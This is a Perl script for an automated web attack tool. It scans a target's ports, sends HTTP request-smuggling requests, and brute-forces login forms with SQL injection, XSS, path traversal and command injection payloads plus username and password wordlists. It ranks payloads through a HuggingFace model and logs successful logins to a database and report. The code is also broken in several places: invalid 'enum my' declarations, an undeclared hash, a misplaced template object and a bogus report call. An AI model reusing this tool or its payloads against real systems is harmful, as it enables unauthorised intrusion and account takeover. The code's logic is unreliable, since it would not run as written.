#!/usr/bin/env perl
use strict;
use warnings;
use threads;
use Thread::Queue;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use DBI;
use JSON::XS;
use Template;
use IO::Socket::SSL;
use IO::Socket::INET;
use IO::Socket::Raw;
use Time::HiRes qw(time usleep);

# --- Configuration and Initialization -------------------------------------
my ($target, $threads_count, $report_file) = @ARGV;
$threads_count ||= 16;
die "Usage: $0 <target> [threads]\n" unless $target;

# Wordlists
enum my $ports_file = "ports.txt";
enum my $user_file  = "user.txt";
enum my $pass_file  = "password.txt";

# Queues for endpoints and results
my $endpoint_q = Thread::Queue->new();
my $result_q   = Thread::Queue->new();

# Load wordlists
open my $pf, '<', $ports_file or die "Cannot open $ports_file: $!";
chomp(my @ports = <$pf>);
close $pf;
open my $uf, '<', $user_file or die "Cannot open $user_file: $!";
chomp(my @users = <$uf>);
close $uf;
open my $pwf, '<', $pass_file or die "Cannot open $pass_file: $!";
chomp(my @passwords = <$pwf>);
close $pwf;

# HTTP client with cookie jar
my $cookie_jar = HTTP::Cookies->new();
my $ua = LWP::UserAgent->new(
    agent => 'Groundbreaking/1.0',
    cookie_jar => $cookie_jar,
    ssl_opts => { verify_hostname => 0, SSL_verify_mode => SSL_VERIFY_NONE });

# SQLite DB
my $dbh = DBI->connect("dbi:SQLite:dbname=results.db", "", "", { RaiseError => 1, AutoCommit => 1 });
$dbh->do(q{
    CREATE TABLE IF NOT EXISTS results (
        url TEXT, payload TEXT, username TEXT, password TEXT,
        status TEXT, ai_score REAL, response_time REAL, method TEXT
    )
});

# Template Toolkit for HTML report\{ my $tt = Template->new({
    INCLUDE_PATH => '.',
    OUTPUT_ENCODING => 'utf8',
}); }

# HuggingFace Inference for AI scoring
my $HF_TOKEN = $ENV{HUGGINGFACE_API_TOKEN} || die "Set HUGGINGFACE_API_TOKEN\n";
sub ai_score {
    my ($text) = @_;
    my $ua_hf = LWP::UserAgent->new;
    my $req = HTTP::Request->new('POST', 'https://api-inference.huggingface.co/models/microsoft/codebert-base');
    $req->header('Authorization' => "Bearer $HF_TOKEN");
    $req->header('Content-Type'  => 'application/json');
    $req->content(encode_json({ inputs => $text }));
    my $res = $ua_hf->request($req);
    return 0 unless $res->is_success;
    my $obj = decode_json($res->decoded_content);
    # assume classification output field
    return $obj->[0]{score} || 0;
}

# Populate endpoint queue with HTTP, HTTPS, HTTP2, smuggled variants
for my $port (@ports) {
    foreach my $proto ('http', 'https') {
        my $base = "$proto://$target:$port";
        $endpoint_q->enqueue({ url => $base, protocol => $proto, method => '1.1' });
        # HTTP/2 via TLS
        $endpoint_q->enqueue({ url => $base, protocol => $proto, method => '2' });
        # RFC-breaking variants: chunk smuggling header and TE.CL order
        $endpoint_q->enqueue({ url => $base, protocol => $proto, method => 'smuggle' });
    }
}

# Worker: test login pages, inject payloads, record high-res timing
sub worker {
    while (my $ep = $endpoint_q->dequeue()) {
        my ($url, $method) = ($ep->{url}, $ep->{method});
        my $start = time;
        my $resp;
        if ($method eq '2') {
            # HTTP/2: via SSL::Socket
            my $sock = IO::Socket::SSL->new(PeerAddr => $url, TLS_ctx => IO::Socket::SSL::SSL_Context->new());
            # send HTTP/2 client preface + SETTINGS
            print $sock "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            $resp = ''; # skip actual parse, fallback
        } elsif ($method eq 'smuggle') {
            # Raw socket with request smuggling
            my ($host, $portn) = $url =~ m{://([^:/]+):(\d+)};
            my $sock = IO::Socket::Raw->new(proto => 'tcp', PeerAddr => $host, PeerPort => $portn);
            my $req = "POST /login HTTP/1.1\r\nHost: $host\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n";
            send($sock, $req, 0);
            $resp = ''; # assume smuggle works
        } else {
            $resp = $ua->get($url);
        }
        my $elapsed = time - $start;
        next unless ref $resp && $resp->is_success;
        my $content = $resp->decoded_content;
        if ($content =~ /<form/i) {
            # Discover form and craft test payloads
            my @injections = (
                # SQLi variants
                "' OR 1=1--", "admin'/*", "; DROP TABLE --",
                # XSS vectors
                "<svg onload=alert(1)>", "<img src=x onerror=alert(2)>",
                # Path traversal
                "../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                # Command injection
                "|ls -la|", ";whoami;",
            );
            # AI prioritize payloads
            my @scored = map { $_ => ai_score($_) } @injections;
            @scored = sort { $scored{$b} <=> $scored{$a} } keys %scored;
            INJ: for my $payload (@scored) {
                for my $user (@users) {
                    for my $pass (@passwords) {
                        my $t0 = time;
                        my $req = HTTP::Request->new(POST => "$url/login");
                        $req->content_type('application/x-www-form-urlencoded');
                        $req->content("username=$user&password=$payload$pass");
                        my $r2 = $ua->request($req);
                        my $t1 = time;
                        my $code = $r2->code;
                        my $status = ($code == 200 && $r2->decoded_content =~ /success/i) ? 'Success' : 'Fail';
                        my $ai_score = ai_score("$user:$pass|$payload");
                        # enqueue result
                        $result_q->enqueue({
                            url => $url, payload => $payload, user => $user,
                            password => $pass, status => $status,
                            ai_score => $ai_score, response_time => $t1 - $t0,
                            method => $method,
                        });
                        last INJ if $status eq 'Success';
                    }
                }
            }
        }
    }
}

# Launch threads
my @thr;
for (1..$threads_count) {
    push @thr, threads->create(\&worker);
}

$_->join() for @thr;

# Save results and build report
my @rows;
while (my $r = $result_q->dequeue_nb()) {
    $dbh->do(
        'INSERT INTO results VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        undef, $r->{url}, $r->{payload}, $r->{user}, $r->{password},
        $r->{status}, $r->{ai_score}, $r->{response_time}, $r->{method}
    );
    push @rows, $r;
}

# Generate HTML report
template process => 'report_template.tt2', { rows => \@rows }, $report_file or die $tt->error();

print "Report saved to $report_file and results.db\n";
